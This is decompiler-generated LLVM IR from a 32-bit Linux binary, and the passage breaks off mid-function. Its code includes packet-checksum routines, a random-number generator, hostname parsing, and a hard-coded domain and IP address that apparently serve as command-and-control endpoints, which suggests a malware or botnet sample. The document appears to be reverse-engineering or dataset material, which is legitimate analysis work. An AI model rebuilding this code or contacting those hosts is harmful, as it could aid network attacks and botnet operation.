source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80542b0.2 = global i32 0
@global_var_80542c8.3 = local_unnamed_addr global i32* @global_var_80542b0.2
@global_var_8054370.5 = local_unnamed_addr global i32 0
@global_var_805437c.6 = local_unnamed_addr global i32 0
@global_var_8054374.7 = local_unnamed_addr global i32 0
@global_var_8054378.8 = local_unnamed_addr global i32 0
@global_var_80543d0.9 = local_unnamed_addr global i32 0
@global_var_80543aa.10 = local_unnamed_addr global i32 0
@global_var_80543b0.11 = local_unnamed_addr global i32 0
@global_var_80543a0.12 = global i32 0
@global_var_80543b8.14 = local_unnamed_addr global i32 0
@global_var_80543c4.15 = local_unnamed_addr global i32 0
@global_var_80543b4.16 = global i32 0
@global_var_805441c.17 = local_unnamed_addr global i32 0
@global_var_80543a4.18 = local_unnamed_addr global i32 0
@global_var_80543fc.19 = local_unnamed_addr global i32 0
@global_var_80543ac.20 = local_unnamed_addr global i32 0
@global_var_8054418.21 = local_unnamed_addr global i32 0
@global_var_8054380.23 = local_unnamed_addr global i32 0
@global_var_80543c8.24 = local_unnamed_addr global i32 0
@global_var_8052b8a.25 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052b02.26 = constant [20 x i8] c"heybud.4horsemen.pw\00"
@global_var_8052b16.27 = constant [12 x i8] c"80.211.2.77\00"
@global_var_8054440.28 = global i32 0
@global_var_80543f4.30 = global i32 0
@global_var_8054540.31 = global i32 0
@global_var_80542e0.32 = global i32 0
@global_var_80545ec.34 = global i32 0
@global_var_80545f0.35 = local_unnamed_addr global i32 0
@global_var_80545f4.36 = global i32 0
@global_var_8054600.37 = local_unnamed_addr global i32 0
@global_var_80548f4.38 = global i32 0
@global_var_805491c.39 = local_unnamed_addr global i32 0
@global_var_805490c.40 = local_unnamed_addr global i32 0
@global_var_8054910.41 = local_unnamed_addr global i32 0
@global_var_8054914.42 = local_unnamed_addr global i32 0
@global_var_8054918.43 = local_unnamed_addr global i32 0
@global_var_8054924.44 = local_unnamed_addr global i32 0
@global_var_8054930.45 = local_unnamed_addr global i32 0
@global_var_8054928.46 = local_unnamed_addr global i32 0
@global_var_8054934.47 = local_unnamed_addr global i32 0
@global_var_8054908.48 = local_unnamed_addr global i32 0
@global_var_8054904.50 = local_unnamed_addr global i32 0
@global_var_805492c.51 = local_unnamed_addr global i32 0
@global_var_80545fc.52 = local_unnamed_addr global i32 0
@global_var_80542f8.53 = global i32 0
@global_var_8054310.55 = global i32 0
@global_var_80543d8.56 = local_unnamed_addr global i32 0
@global_var_80542a4.58 = global i32 -1
@global_var_80520a3.59 = constant i32 -294069
@global_var_80543e8.60 = local_unnamed_addr global i32 0
@global_var_80543ec.61 = local_unnamed_addr global i32 0
@global_var_8052f8c.62 = constant [10 x i8] c"/dev/null\00"
@global_var_80543e4.64 = local_unnamed_addr global i32 0
@global_var_80543dc.65 = local_unnamed_addr global i32 0
@global_var_80543e0.66 = local_unnamed_addr global i32 0
@global_var_80530a0.68 = constant i32 33554944
@global_var_8052289.69 = constant i32 1928542531
@global_var_80522ad.70 = constant i32 1928542531
@global_var_80543f8.71 = local_unnamed_addr global i32 0
@global_var_805432c.72 = local_unnamed_addr global i32* @global_var_80530a0.68
@global_var_8054938.73 = local_unnamed_addr global i32 0
@global_var_805493c.74 = local_unnamed_addr global i32 0
@global_var_8054340.1 = local_unnamed_addr global i8 0
@global_var_80543b6.13 = local_unnamed_addr global i16 0
@global_var_80543cc.22 = local_unnamed_addr global i16 0
@global_var_80542dc.29 = local_unnamed_addr global i16 -1105
@global_var_80545c0.33 = global i8 0
@global_var_8054920.49 = local_unnamed_addr global i8 0
@global_var_80543d4.54 = local_unnamed_addr global i8 0
@global_var_80543f0.63 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 49691
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052ac0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8054340.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80542c8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80542c8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80542c8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8054340.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80542c8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8054340.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134558368)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_805213f(i32 134533008, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134556390, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a18 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a18
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134556390

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d6e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d6e0:
  %v0_804d6e0 = load i32, i32* @global_var_8054370.5, align 16
  %v0_804d6e8 = load i32, i32* @global_var_805437c.6, align 4
  %v2_804d6ee = mul i32 %v0_804d6e0, 2048
  %v2_804d6f3 = udiv i32 %v0_804d6e8, 524288
  store i32 %v2_804d6f3, i32* @ecx, align 4
  %v2_804d6f6 = xor i32 %v2_804d6ee, %v0_804d6e0
  %v0_804d6f8 = load i32, i32* @global_var_8054374.7, align 4
  store i32 %v0_804d6f8, i32* @global_var_8054370.5, align 16
  %v0_804d702 = load i32, i32* @global_var_8054378.8, align 8
  store i32 %v0_804d702, i32* @global_var_8054374.7, align 4
  store i32 %v0_804d6e8, i32* @global_var_8054378.8, align 8
  %v2_804d714 = xor i32 %v2_804d6f3, %v0_804d6e8
  %v2_804d716 = udiv i32 %v2_804d6f6, 256
  %v2_804d719 = xor i32 %v2_804d716, %v2_804d6f6
  %v2_804d71b = xor i32 %v2_804d719, %v2_804d714
  store i32 %v2_804d71b, i32* @global_var_805437c.6, align 4
  ret i32 %v2_804d71b

; uselistorder directives
  uselistorder i32 %v2_804d6f6, { 1, 0 }
  uselistorder i32 %v2_804d6f3, { 1, 0 }
  uselistorder i32 %v0_804d6e8, { 1, 2, 0 }
  uselistorder i32 %v0_804d6e0, { 1, 0 }
}

define i32 @function_804d910() local_unnamed_addr {
dec_label_pc_804d910:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804d910 = load i32, i32* @ebx, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_804d918 = icmp eq i32 %tmp, 0
  br i1 %v1_804d918, label %dec_label_pc_804d910.dec_label_pc_804d940_crit_edge, label %dec_label_pc_804d91c

dec_label_pc_804d910.dec_label_pc_804d940_crit_edge: ; preds = %dec_label_pc_804d910
  br label %dec_label_pc_804d940

dec_label_pc_804d91c:                             ; preds = %dec_label_pc_804d910
  %v1_804d91c = add i32 %tmp, 4
  %v2_804d91c = inttoptr i32 %v1_804d91c to i32*
  %v3_804d91c = load i32, i32* %v2_804d91c, align 4
  %v1_804d91f = icmp eq i32 %v3_804d91c, 0
  br i1 %v1_804d91f, label %dec_label_pc_804d92f, label %dec_label_pc_804d923

dec_label_pc_804d923:                             ; preds = %dec_label_pc_804d91c
  %v1_804d927 = call i32 @function_8051963(i32 %v3_804d91c)
  br label %dec_label_pc_804d92f

dec_label_pc_804d92f:                             ; preds = %dec_label_pc_804d91c, %dec_label_pc_804d923
  store i32 %v0_804d910, i32* @ebx, align 4
  %v1_804d936 = call i32 @function_8051963(i32 %tmp)
  %v2_804d940.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804d940

dec_label_pc_804d940:                             ; preds = %dec_label_pc_804d910.dec_label_pc_804d940_crit_edge, %dec_label_pc_804d92f
  %v2_804d940 = phi i32 [ %tmp12, %dec_label_pc_804d910.dec_label_pc_804d940_crit_edge ], [ %v2_804d940.pre, %dec_label_pc_804d92f ]
  store i32 %v0_804d910, i32* @ebx, align 4
  ret i32 %v2_804d940

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804d940, { 1, 0 }
  uselistorder label %dec_label_pc_804d92f, { 1, 0 }
}

define i32 @function_804d950() local_unnamed_addr {
dec_label_pc_804d950:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp89 = call i8* @__decompiler_undefined_function_5()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804d95c = ptrtoint i8* %tmp89 to i32
  store i32 %v4_804d95c, i32* @ebx, align 4
  %v4_804d967 = call i32 @function_8051312(i64 1, i32 8)
  %v2_804d970 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804d970, i32* %eax.global-to-local, align 4
  %tmp101 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804d97b = load i32, i32* @ebx, align 4
  %v4_804d97b = inttoptr i32 %v0_804d97b to i8*
  %v3_804d97e = call i32 @function_804fd10(i8* %v4_804d97b)
  %v2_804d983 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804d983, i32* %ecx.global-to-local, align 4
  %v1_804d98a = add i32 %v3_804d97e, 1
  store i32 %v1_804d98a, i32* %eax.global-to-local, align 4
  store i32 %v2_804d970, i32* %edi.global-to-local, align 4
  %tmp102 = icmp slt i32 %v1_804d98a, 1
  br i1 %tmp102, label %dec_label_pc_804d9b3, label %dec_label_pc_804d996

dec_label_pc_804d996:                             ; preds = %dec_label_pc_804d950, %dec_label_pc_804d9af
  %v2_804d9a9 = phi i32 [ %v2_804d9a931, %dec_label_pc_804d9af ], [ %v2_804d983, %dec_label_pc_804d950 ]
  %v0_804d996 = load i32, i32* @ebx, align 4
  %v1_804d996 = inttoptr i32 %v0_804d996 to i8*
  %v2_804d996 = load i8, i8* %v1_804d996, align 1
  %v3_804d996 = zext i8 %v2_804d996 to i32
  %v4_804d996 = load i32, i32* @edx, align 4
  %v5_804d996 = and i32 %v4_804d996, -256
  %v6_804d996 = or i32 %v5_804d996, %v3_804d996
  store i32 %v6_804d996, i32* @edx, align 4
  switch i8 %v2_804d996, label %dec_label_pc_804d9a9 [
    i8 46, label %dec_label_pc_804dbd0
    i8 0, label %dec_label_pc_804dbd0
  ]

dec_label_pc_804d9a9:                             ; preds = %dec_label_pc_804d996
  %v3_804d9a9 = inttoptr i32 %v2_804d9a9 to i8*
  store i8 %v2_804d996, i8* %v3_804d9a9, align 1
  %v0_804d9ab = load i32, i32* @esi, align 4
  %v1_804d9ab = add i32 %v0_804d9ab, 1
  store i32 %v1_804d9ab, i32* @esi, align 4
  %v0_804d9ac = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d9ac = add i32 %v0_804d9ac, 1
  store i32 %v1_804d9ac, i32* %ecx.global-to-local, align 4
  %v0_804d9ad = load i32, i32* @ebx, align 4
  %v1_804d9ad = add i32 %v0_804d9ad, 1
  store i32 %v1_804d9ad, i32* @ebx, align 4
  %v0_804d9ae = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9ae = add i32 %v0_804d9ae, -1
  store i32 %v1_804d9ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d9af

dec_label_pc_804d9af:                             ; preds = %dec_label_pc_804dbd0, %dec_label_pc_804d9a9
  %v0_804d9af = phi i32 [ %v1_804dbd9, %dec_label_pc_804dbd0 ], [ %v1_804d9ae, %dec_label_pc_804d9a9 ]
